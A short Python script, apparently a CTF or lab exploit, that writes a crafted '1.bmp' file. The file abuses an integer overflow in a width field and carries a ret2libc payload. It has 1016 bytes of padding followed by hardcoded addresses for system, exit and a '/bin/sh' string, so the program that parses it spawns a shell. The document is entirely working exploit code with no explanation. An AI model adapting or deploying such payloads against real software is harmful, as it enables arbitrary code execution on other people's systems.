import struct

MAX_INT     = 2**(31) -1    # 2147483647
MIN_INT     = -2**(31)      # -2147483648
                            # get to MIN_INT + 2147483748 = 100

WIDTH   = 2**(31) + 404     #integer overflow, 404 imortant to copy up to binsh
LENGTH  = 1
#padding + system + exit + binsh
img     = b'\x41' * 1016 + struct.pack('<I', 0xf7e2cd10) + struct.pack('<I', 0xf7e1ff70) + struct.pack('<I', 0xf7f6b8cf)

b_length    = struct.pack('I', LENGTH)
b_width     = struct.pack('I', WIDTH)

with open('1.bmp', 'wb') as handle:
        handle.write( b_length + b_width + struct.pack('I', 0xd5dac1d1) + img)  #set struct value to hash